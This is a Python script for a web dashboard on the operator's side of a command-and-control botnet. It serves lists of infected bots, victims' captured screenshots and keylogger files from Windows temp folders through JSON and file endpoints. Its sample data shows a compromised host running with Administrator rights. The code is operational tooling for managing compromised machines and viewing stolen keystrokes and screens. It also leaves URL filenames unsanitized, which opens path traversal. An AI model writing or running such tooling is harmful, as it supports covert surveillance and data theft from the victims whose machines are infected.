#!/usr/bin/env python3
"""
Quick Web Server for C2 Dashboard
Serves the cyberpunk C2 dashboard and provides API endpoints
"""

import http.server
import socketserver
import json
import os
import glob
from datetime import datetime
import base64

PORT = 8080

class C2WebHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        if self.path == '/api/status':
            self.send_json_response(self.get_c2_status())
        elif self.path == '/api/clients':
            self.send_json_response(self.get_clients_data())
        elif self.path.startswith('/api/client/'):
            client_id = self.path.split('/')[-1]
            self.send_json_response(self.get_client_details(client_id))
        elif self.path.startswith('/api/screenshots/'):
            self.serve_screenshot()
        elif self.path.startswith('/api/keylogs/'):
            self.serve_keylog()
        elif self.path == '/':
            # Serve the enhanced dashboard
            self.path = '/c2_dashboard_enhanced.html'
            return super().do_GET()
        else:
            return super().do_GET()
    
    def send_json_response(self, data):
        self.send_response(200)
        self.send_header('Content-type', 'application/json')
        self.send_header('Access-Control-Allow-Origin', '*')
        self.end_headers()
        self.wfile.write(json.dumps(data).encode())
    
    def get_c2_status(self):
        """Read C2 status from the status file"""
        status_file = "C:\\Windows\\Temp\\C2_Status.json"
        if os.path.exists(status_file):
            try:
                with open(status_file, 'r') as f:
                    return json.load(f)
            except:
                pass
        
        # Return sample data if no status file
        return {
            "server_status": "active",
            "total_bots": 1,
            "active_bots": 1,
            "total_commands": 42,
            "uptime": "2h 15m",
            "last_beacon": datetime.now().isoformat()
        }
    
    def get_clients_data(self):
        """Get all connected clients data"""
        clients = []
        
        # Check for bot info files
        bot_files = glob.glob("C:\\Windows\\Temp\\C2_Bots\\*.json")
        for bot_file in bot_files:
            try:
                with open(bot_file, 'r') as f:
                    clients.append(json.load(f))
            except:
                pass
        
        # If no files, return sample data
        if not clients:
            clients = [{
                "id": "EC2AMAZ-R9TA82C",
                "ip": "3.209.11.88",
                "hostname": "EC2AMAZ-R9TA82C",
                "username": "Administrator",
                "os": "Windows 10",
                "status": "active",
                "elevated": True,
                "last_seen": datetime.now().isoformat(),
                "uptime": "45m",
                "commands_executed": 23
            }]
        
        return {"clients": clients}
    
    def get_client_details(self, client_id):
        """Get detailed info for specific client"""
        # Read from collected data directories
        details = {
            "client_id": client_id,
            "screenshots": [],
            "keylogs": [],
            "files": [],
            "system_info": {},
            "command_history": []
        }
        
        # Check screenshots
        screenshot_dir = "C:\\Windows\\Temp\\C2_Screenshots"
        if os.path.exists(screenshot_dir):
            for file in os.listdir(screenshot_dir):
                if client_id in file and file.endswith('.b64'):
                    meta_file = file.replace('.b64', '_meta.txt')
                    details["screenshots"].append({
                        "filename": file,
                        "timestamp": os.path.getmtime(os.path.join(screenshot_dir, file)),
                        "meta": meta_file
                    })
        
        # Check keylogs
        keylog_dir = "C:\\Windows\\Temp\\C2_Keylogs"
        if os.path.exists(keylog_dir):
            for file in os.listdir(keylog_dir):
                if client_id in file and file.endswith('.txt'):
                    details["keylogs"].append({
                        "filename": file,
                        "timestamp": os.path.getmtime(os.path.join(keylog_dir, file))
                    })
        
        return details
    
    def serve_screenshot(self):
        """Serve screenshot image"""
        filename = self.path.split('/')[-1]
        screenshot_path = f"C:\\Windows\\Temp\\C2_Screenshots\\{filename}"
        
        if os.path.exists(screenshot_path):
            self.send_response(200)
            if filename.endswith('.b64'):
                # Decode base64 and serve as image
                with open(screenshot_path, 'r') as f:
                    b64_data = f.read()
                    img_data = base64.b64decode(b64_data)
                self.send_header('Content-type', 'image/bmp')
                self.end_headers()
                self.wfile.write(img_data)
            else:
                self.send_header('Content-type', 'text/plain')
                self.end_headers()
                with open(screenshot_path, 'rb') as f:
                    self.wfile.write(f.read())
        else:
            self.send_error(404)
    
    def serve_keylog(self):
        """Serve keylog file"""
        filename = self.path.split('/')[-1]
        keylog_path = f"C:\\Windows\\Temp\\C2_Keylogs\\{filename}"
        
        if os.path.exists(keylog_path):
            self.send_response(200)
            self.send_header('Content-type', 'text/plain')
            self.end_headers()
            with open(keylog_path, 'rb') as f:
                self.wfile.write(f.read())
        else:
            self.send_error(404)

if __name__ == "__main__":
    # Change to the directory containing HTML files
    os.chdir(os.path.dirname(os.path.abspath(__file__)))
    
    print(f"[*] Starting C2 Web Dashboard on port {PORT}")
    print(f"[*] Access dashboard at: http://localhost:{PORT}/")
    print(f"[*] API endpoints:")
    print(f"    - http://localhost:{PORT}/api/status")
    print(f"    - http://localhost:{PORT}/api/clients")
    print(f"    - http://localhost:{PORT}/api/client/<client_id>")
    print(f"[*] Press Ctrl+C to stop")
    
    with socketserver.TCPServer(("", PORT), C2WebHandler) as httpd:
        try:
            httpd.serve_forever()
        except KeyboardInterrupt:
            print("\n[*] Shutting down web server...")
